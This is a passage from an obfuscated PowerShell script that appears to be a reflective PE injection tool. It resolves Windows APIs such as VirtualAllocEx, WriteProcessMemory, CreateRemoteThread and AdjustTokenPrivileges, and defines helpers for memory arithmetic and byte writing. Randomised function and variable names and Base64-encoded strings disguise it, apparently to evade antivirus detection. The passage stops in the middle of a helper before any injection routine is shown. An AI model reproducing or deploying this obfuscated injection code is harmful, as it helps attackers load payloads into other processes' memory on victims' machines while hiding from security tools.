		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		return $Win32Constants
	}
	Function e17a4d1d978844eb8928769c36ef96fa
	{
		$Win32Functions = New-Object System.Object
		${56835c0295e54d109472ca21a1375d68} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll VirtualAlloc
		${b260a092398e4382af050997d9ed155a} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${3b0310945289412fb9919c50ec2bd44b} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${56835c0295e54d109472ca21a1375d68}, ${b260a092398e4382af050997d9ed155a})
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value ${3b0310945289412fb9919c50ec2bd44b}
		${89637e54f53c47fba5e7b3a7e19b17a9} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll VirtualAllocEx
		${11f050d218954122b2ddce58d94c2006} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${bf2f9e6eb15b4574aef157d3e42794fb} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${89637e54f53c47fba5e7b3a7e19b17a9}, ${11f050d218954122b2ddce58d94c2006})
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value ${bf2f9e6eb15b4574aef157d3e42794fb}
		${2ed51b09a13f43ca9e2cfe9371a284e4} = b18d8aa7bc714d5fa74846d987300d0f msvcrt.dll memcpy
		${9829b8dc03e5450e9118132752b29959} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${41977aa9e958419c9856fbd674b36541} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${2ed51b09a13f43ca9e2cfe9371a284e4}, ${9829b8dc03e5450e9118132752b29959})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value ${41977aa9e958419c9856fbd674b36541}
		${61d350bf0eef408799705504c1e0f56a} = b18d8aa7bc714d5fa74846d987300d0f msvcrt.dll memset
		${c104189c243f4afb8c1739731f884e42} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${d53d4660bc8f4ba28b375523a2cdc04d} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${61d350bf0eef408799705504c1e0f56a}, ${c104189c243f4afb8c1739731f884e42})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value ${d53d4660bc8f4ba28b375523a2cdc04d}
		${c032d91b8ee0492e8960f98931b68749} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll LoadLibraryA
		${6071af4af6dd49d6a36f92e3a570401e} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([String]) ([IntPtr])
		${458ad3578ca04752b8abd78633970add} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${c032d91b8ee0492e8960f98931b68749}, ${6071af4af6dd49d6a36f92e3a570401e})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value ${458ad3578ca04752b8abd78633970add}
		${abb172930bf74b728a574fcaf72aa9df} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll GetProcAddress
		${1d743018d1d24c6ca78b090af85758f1} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [String]) ([IntPtr])
		${8b2e8cad9d0e4b74b486eafa4b413b71} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${abb172930bf74b728a574fcaf72aa9df}, ${1d743018d1d24c6ca78b090af85758f1})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value ${8b2e8cad9d0e4b74b486eafa4b413b71}
		${51e045af6dbe464ba8a2880814c4c2a4} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll GetProcAddress 
		${81ea3ad7e6d84c22a90795717805d1bb} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [IntPtr]) ([IntPtr])
		${85d0756c070a467c9c82b14f68f662fe} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${51e045af6dbe464ba8a2880814c4c2a4}, ${81ea3ad7e6d84c22a90795717805d1bb})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value ${85d0756c070a467c9c82b14f68f662fe}
		${2b6d951dd44e46ad8c9baf43ba816583} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll VirtualFree
		${2e836208054542068ae171e744d513eb} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${ba0073c20e8b4d299b24aa638ffa0b15} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${2b6d951dd44e46ad8c9baf43ba816583}, ${2e836208054542068ae171e744d513eb})
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value ${ba0073c20e8b4d299b24aa638ffa0b15}
		${0a35a17ba99c4c62ab1bbeac978a2114} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll VirtualFreeEx
		${9eb918216cfd4fb9922ea1ce0a695738} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${a8c16283d86441d197d4cb5197ebfced} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${0a35a17ba99c4c62ab1bbeac978a2114}, ${9eb918216cfd4fb9922ea1ce0a695738})
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value ${a8c16283d86441d197d4cb5197ebfced}
		${99ef0fdd2fa54b228ce4edb3f73e36e2} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll VirtualProtect
		${d7ea48607df74052a3dfdb15576de834} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		${fb52b15500384c1681cc2c082cbe352e} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${99ef0fdd2fa54b228ce4edb3f73e36e2}, ${d7ea48607df74052a3dfdb15576de834})
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value ${fb52b15500384c1681cc2c082cbe352e}
		${96cd261e371b4f4183cfa4d0b2254d30} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll GetModuleHandleA
		${14f2793e77b74923961281005b4181f2} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([String]) ([IntPtr])
		${3139fa00b9c94d37b35d66d69a0266d3} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${96cd261e371b4f4183cfa4d0b2254d30}, ${14f2793e77b74923961281005b4181f2})
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value ${3139fa00b9c94d37b35d66d69a0266d3}
		${7db831d06fe34306a25119d4fc03f3cc} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll FreeLibrary
		${6608f0453fb14aceb49df6c3bf90289b} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr]) ([Bool])
		${b3c693b15a904a839306dc4ca16d9533} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${7db831d06fe34306a25119d4fc03f3cc}, ${6608f0453fb14aceb49df6c3bf90289b})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value ${b3c693b15a904a839306dc4ca16d9533}
		${8edfc6b0659349909e452ee7b7b06f9d} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll OpenProcess
	    ${5bc6213fbd7547d7922812ec551b0aa5} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${f6e89b63cc0d4bb888b1985846767343} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${8edfc6b0659349909e452ee7b7b06f9d}, ${5bc6213fbd7547d7922812ec551b0aa5})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value ${f6e89b63cc0d4bb888b1985846767343}
		${e2527dca43514366a3a8dbefe7ce82fc} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll WaitForSingleObject
	    ${8931e65d72d743de978e51c19ea170e5} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [UInt32]) ([UInt32])
	    ${f7689b01df834c0d81742f2474f953d0} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${e2527dca43514366a3a8dbefe7ce82fc}, ${8931e65d72d743de978e51c19ea170e5})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value ${f7689b01df834c0d81742f2474f953d0}
		${30333408446a4648ac270cf5be0273db} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll WriteProcessMemory
        ${8e12f3c55c724b9e8302dd61e4c0f044} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${9e04fd3b1efd4ac88afd0854b20debfe} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${30333408446a4648ac270cf5be0273db}, ${8e12f3c55c724b9e8302dd61e4c0f044})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value ${9e04fd3b1efd4ac88afd0854b20debfe}
		${517b2de9df1a449383529595af66ff9e} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll ReadProcessMemory
        ${7cddba5071ca466a843e8b7ecaf82de2} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${e3dd0f7affb746d4837850b571cfe4df} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${517b2de9df1a449383529595af66ff9e}, ${7cddba5071ca466a843e8b7ecaf82de2})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value ${e3dd0f7affb746d4837850b571cfe4df}
		${601b0bc54a894c169787bc7971d4ef4a} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll CreateRemoteThread
        ${8f007efefae6486bbf6f42819dfe53d3} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${b9635c0fb4854910805ceeb050d596ea} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${601b0bc54a894c169787bc7971d4ef4a}, ${8f007efefae6486bbf6f42819dfe53d3})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value ${b9635c0fb4854910805ceeb050d596ea}
		${8bedb1ae396d4997b3bbe90ce4137225} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll GetExitCodeThread
        ${74de21a460db45a09118f8dfb02919f9} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        ${cda43560f3194085a0cf177d2e4ab77c} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${8bedb1ae396d4997b3bbe90ce4137225}, ${74de21a460db45a09118f8dfb02919f9})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value ${cda43560f3194085a0cf177d2e4ab77c}
		${58047d2c26f24af8ba06aa1f79258322} = b18d8aa7bc714d5fa74846d987300d0f Advapi32.dll OpenThreadToken
        ${0655a18337374290a36a431f16952ae5} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        ${7bfb60e42d7c47d98c107338491c1346} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${58047d2c26f24af8ba06aa1f79258322}, ${0655a18337374290a36a431f16952ae5})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value ${7bfb60e42d7c47d98c107338491c1346}
		${a0c7c7f08e064d6683e03349ba6c2c23} = b18d8aa7bc714d5fa74846d987300d0f kernel32.dll GetCurrentThread
        ${a8d6c91380b344adabe8250c93016d0b} = e90fcebe8d7842cc97fa4b1a2265a8e3 @() ([IntPtr])
        ${9aa165179fc84a1d874752adee89012c} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${a0c7c7f08e064d6683e03349ba6c2c23}, ${a8d6c91380b344adabe8250c93016d0b})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value ${9aa165179fc84a1d874752adee89012c}
		${b0d2041f7ab4479b9817936dc74c0c01} = b18d8aa7bc714d5fa74846d987300d0f Advapi32.dll AdjustTokenPrivileges
        ${8ec6c0efe6ea4daab9a38aabba8bd87b} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${b7fb32106a7b45f183fdd60ffe845c9f} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${b0d2041f7ab4479b9817936dc74c0c01}, ${8ec6c0efe6ea4daab9a38aabba8bd87b})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value ${b7fb32106a7b45f183fdd60ffe845c9f}
		${40cc985222414460b637d0898e7f0563} = b18d8aa7bc714d5fa74846d987300d0f Advapi32.dll LookupPrivilegeValueA
        ${8a8d052a9156485e9645206e607d999c} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([String], [String], [IntPtr]) ([Bool])
        ${48a6af2d2ed344ac86d0f1ff865419f6} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${40cc985222414460b637d0898e7f0563}, ${8a8d052a9156485e9645206e607d999c})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value ${48a6af2d2ed344ac86d0f1ff865419f6}
		${e015b951450d41ddae4763fa609b07e8} = b18d8aa7bc714d5fa74846d987300d0f Advapi32.dll ImpersonateSelf
        ${4307b69b65c643748fea7a01795738c9} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([Int32]) ([Bool])
        ${afb4b6fa53764e65a812685fa6e87db8} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${e015b951450d41ddae4763fa609b07e8}, ${4307b69b65c643748fea7a01795738c9})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value ${afb4b6fa53764e65a812685fa6e87db8}
        if (([Environment]::OSVersion.Version -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2))) {
		    ${adf06458037c4db88ddfce2b913dd7b6} = b18d8aa7bc714d5fa74846d987300d0f NtDll.dll NtCreateThreadEx
            ${85fb5f2c7e6143ccb872a670dc42e0bc} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${07aab27a926945ff8c1bc83c7e449577} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${adf06458037c4db88ddfce2b913dd7b6}, ${85fb5f2c7e6143ccb872a670dc42e0bc})
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value ${07aab27a926945ff8c1bc83c7e449577}
        }
		${08cfe650aff5487e86ce9c7983a3cf65} = b18d8aa7bc714d5fa74846d987300d0f Kernel32.dll IsWow64Process
        ${65386e4c943b402ab8256fa086b5f140} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        ${ddc00c273af44078a0047632a401de39} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${08cfe650aff5487e86ce9c7983a3cf65}, ${65386e4c943b402ab8256fa086b5f140})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value ${ddc00c273af44078a0047632a401de39}
		${2d74d7725eca499183eb4f3e9594dc3d} = b18d8aa7bc714d5fa74846d987300d0f Kernel32.dll CreateThread
        ${5c7e7a1b721e4b7ebde6fa7613aa8c21} = e90fcebe8d7842cc97fa4b1a2265a8e3 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        ${a5eb0b50089848449f06e576aa01a282} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${2d74d7725eca499183eb4f3e9594dc3d}, ${5c7e7a1b721e4b7ebde6fa7613aa8c21})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value ${a5eb0b50089848449f06e576aa01a282}
		return $Win32Functions
	}
	Function eaa6a815d554449ebfc9210a329090f4
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${b4317ecbe19a443ba556694582effbf6},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${d86540b7af2f4e319a9afeb0a5bce5cd}
		)
		[Byte[]]${131ea9e7bb8f40f1b45e9ba35812c794} = [BitConverter]::GetBytes(${b4317ecbe19a443ba556694582effbf6})
		[Byte[]]${91d1ac73668c497b9e0d28cef6eae3e4} = [BitConverter]::GetBytes(${d86540b7af2f4e319a9afeb0a5bce5cd})
		[Byte[]]${c01158aa8a3c49b1a8f656bca3a00181} = [BitConverter]::GetBytes([UInt64]0)
		if (${131ea9e7bb8f40f1b45e9ba35812c794}.Count -eq ${91d1ac73668c497b9e0d28cef6eae3e4}.Count)
		{
			${c8230800c29a482f88517e4e50641878} = 0
			for (${becf8c3d80c34e9fbea46c736519a57b} = 0; ${becf8c3d80c34e9fbea46c736519a57b} -lt ${131ea9e7bb8f40f1b45e9ba35812c794}.Count; ${becf8c3d80c34e9fbea46c736519a57b}++)
			{
				${0187535365ca4b2594b6ae6ac833323d} = ${131ea9e7bb8f40f1b45e9ba35812c794}[${becf8c3d80c34e9fbea46c736519a57b}] - ${c8230800c29a482f88517e4e50641878}
				if (${0187535365ca4b2594b6ae6ac833323d} -lt ${91d1ac73668c497b9e0d28cef6eae3e4}[${becf8c3d80c34e9fbea46c736519a57b}])
				{
					${0187535365ca4b2594b6ae6ac833323d} += 256
					${c8230800c29a482f88517e4e50641878} = 1
				}
				else
				{
					${c8230800c29a482f88517e4e50641878} = 0
				}
				[UInt16]${b3a32d459a0143259af07124c23e4d8a} = ${0187535365ca4b2594b6ae6ac833323d} - ${91d1ac73668c497b9e0d28cef6eae3e4}[${becf8c3d80c34e9fbea46c736519a57b}]
				${c01158aa8a3c49b1a8f656bca3a00181}[${becf8c3d80c34e9fbea46c736519a57b}] = ${b3a32d459a0143259af07124c23e4d8a} -band 0x00FF
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABzAHUAYgB0AHIAYQBjAHQAIABiAHkAdABlAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAHMA')))
		}
		return [BitConverter]::ToInt64(${c01158aa8a3c49b1a8f656bca3a00181}, 0)
	}
	Function c36a6fff11ae41aab0147e8eb916744d
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${b4317ecbe19a443ba556694582effbf6},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${d86540b7af2f4e319a9afeb0a5bce5cd}
		)
		[Byte[]]${131ea9e7bb8f40f1b45e9ba35812c794} = [BitConverter]::GetBytes(${b4317ecbe19a443ba556694582effbf6})
		[Byte[]]${91d1ac73668c497b9e0d28cef6eae3e4} = [BitConverter]::GetBytes(${d86540b7af2f4e319a9afeb0a5bce5cd})
		[Byte[]]${c01158aa8a3c49b1a8f656bca3a00181} = [BitConverter]::GetBytes([UInt64]0)
		if (${131ea9e7bb8f40f1b45e9ba35812c794}.Count -eq ${91d1ac73668c497b9e0d28cef6eae3e4}.Count)
		{
			${c8230800c29a482f88517e4e50641878} = 0
			for (${becf8c3d80c34e9fbea46c736519a57b} = 0; ${becf8c3d80c34e9fbea46c736519a57b} -lt ${131ea9e7bb8f40f1b45e9ba35812c794}.Count; ${becf8c3d80c34e9fbea46c736519a57b}++)
			{
				[UInt16]${b3a32d459a0143259af07124c23e4d8a} = ${131ea9e7bb8f40f1b45e9ba35812c794}[${becf8c3d80c34e9fbea46c736519a57b}] + ${91d1ac73668c497b9e0d28cef6eae3e4}[${becf8c3d80c34e9fbea46c736519a57b}] + ${c8230800c29a482f88517e4e50641878}
				${c01158aa8a3c49b1a8f656bca3a00181}[${becf8c3d80c34e9fbea46c736519a57b}] = ${b3a32d459a0143259af07124c23e4d8a} -band 0x00FF
				if ((${b3a32d459a0143259af07124c23e4d8a} -band 0xFF00) -eq 0x100)
				{
					${c8230800c29a482f88517e4e50641878} = 1
				}
				else
				{
					${c8230800c29a482f88517e4e50641878} = 0
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABhAGQAZAAgAGIAeQB0AGUAYQByAHIAYQB5AHMAIABvAGYAIABkAGkAZgBmAGUAcgBlAG4AdAAgAHMAaQB6AGUAcwA=')))
		}
		return [BitConverter]::ToInt64(${c01158aa8a3c49b1a8f656bca3a00181}, 0)
	}
	Function d4dd55ea8a9b4bbf82495bf963ddcb8f
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${b4317ecbe19a443ba556694582effbf6},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${d86540b7af2f4e319a9afeb0a5bce5cd}
		)
		[Byte[]]${131ea9e7bb8f40f1b45e9ba35812c794} = [BitConverter]::GetBytes(${b4317ecbe19a443ba556694582effbf6})
		[Byte[]]${91d1ac73668c497b9e0d28cef6eae3e4} = [BitConverter]::GetBytes(${d86540b7af2f4e319a9afeb0a5bce5cd})
		if (${131ea9e7bb8f40f1b45e9ba35812c794}.Count -eq ${91d1ac73668c497b9e0d28cef6eae3e4}.Count)
		{
			for (${becf8c3d80c34e9fbea46c736519a57b} = ${131ea9e7bb8f40f1b45e9ba35812c794}.Count-1; ${becf8c3d80c34e9fbea46c736519a57b} -ge 0; ${becf8c3d80c34e9fbea46c736519a57b}--)
			{
				if (${131ea9e7bb8f40f1b45e9ba35812c794}[${becf8c3d80c34e9fbea46c736519a57b}] -gt ${91d1ac73668c497b9e0d28cef6eae3e4}[${becf8c3d80c34e9fbea46c736519a57b}])
				{
					return $true
				}
				elseif (${131ea9e7bb8f40f1b45e9ba35812c794}[${becf8c3d80c34e9fbea46c736519a57b}] -lt ${91d1ac73668c497b9e0d28cef6eae3e4}[${becf8c3d80c34e9fbea46c736519a57b}])
				{
					return $false
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABjAG8AbQBwAGEAcgBlACAAYgB5AHQAZQAgAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAA==')))
		}
		return $false
	}
	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		[Byte[]]${4f0f7e3e7d1445ea989a304452c1575c} = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64(${4f0f7e3e7d1445ea989a304452c1575c}, 0))
	}
    Function b2b513762da64d59b95fcbd6d9534bf7
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value 
        )
        ${dfc7f8d5774448749d1a2e8bfb94a3c4} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        ${8d6a1c7589254f7e806b6c60f72cf299} = "0x{0:X$(${dfc7f8d5774448749d1a2e8bfb94a3c4})}" -f [Int64]$Value 
        return ${8d6a1c7589254f7e806b6c60f72cf299}
    }
	Function a1e9aa887dff49f193f787680e08120c
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${d97abdfba05048a9adf731f2568896bb},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${b5905e299da14ea186abe1140fee1a54},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${e8467a7c0eca496ebed04014d585d83a},
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		${acd1470f6ef3448bb8a0459bcfc8e55e}
		)
	    [IntPtr]${00f9a439dea04d13b3bce46f200f2e4f} = [IntPtr](c36a6fff11ae41aab0147e8eb916744d (${e8467a7c0eca496ebed04014d585d83a}) (${acd1470f6ef3448bb8a0459bcfc8e55e}))
		${fcc60f06214f44efaf6bdbadcb602a00} = ${b5905e299da14ea186abe1140fee1a54}.EndAddress
		if ((d4dd55ea8a9b4bbf82495bf963ddcb8f (${b5905e299da14ea186abe1140fee1a54}.PEHandle) (${e8467a7c0eca496ebed04014d585d83a})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAHMAbQBhAGwAbABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAZAA5ADcAYQBiAGQAZgBiAGEAMAA1ADAANAA4AGEAOQBhAGQAZgA3ADMAMQBmADIANQA2ADgAOAA5ADYAYgBiAH0A')))
		}
		if ((d4dd55ea8a9b4bbf82495bf963ddcb8f (${00f9a439dea04d13b3bce46f200f2e4f}) (${fcc60f06214f44efaf6bdbadcb602a00})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAGcAcgBlAGEAdABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAZAA5ADcAYQBiAGQAZgBiAGEAMAA1ADAANAA4AGEAOQBhAGQAZgA3ADMAMQBmADIANQA2ADgAOAA5ADYAYgBiAH0A')))
		}
	}
	Function d7d2ae269baa46a58bd04253c3153bc2
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			${edfb5fb877c340feb6fd2a333d64fd54},
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			${cc9e6267b5c84fa69bc06f7a58cb4fb0}
		)
		for (${7af75c86913f4a3884a0e4e3ab560ad7} = 0; ${7af75c86913f4a3884a0e4e3ab560ad7} -lt ${edfb5fb877c340feb6fd2a333d64fd54}.Length; ${7af75c86913f4a3884a0e4e3ab560ad7}++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte(${cc9e6267b5c84fa69bc06f7a58cb4fb0}, ${7af75c86913f4a3884a0e4e3ab560ad7}, ${edfb5fb877c340feb6fd2a333d64fd54}[${7af75c86913f4a3884a0e4e3ab560ad7}])
		}
	}
	Function e90fcebe8d7842cc97fa4b1a2265a8e3
	{
	    Param
	    (
	        [OutputType([Type])]
	        [Parameter( Position = 0)]
	        [Type[]]
	        ${a7107a3b6abb473a8953fbe18f6cb377} = (New-Object Type[](0)),
	        [Parameter( Position = 1 )]
	        [Type]
	        ${b16e39a06cd94d89ad5bc734e1f76966} = [Void]
	    )
	    ${e21330ab334d4b779edeb53d24bb8eef} = [AppDomain]::CurrentDomain
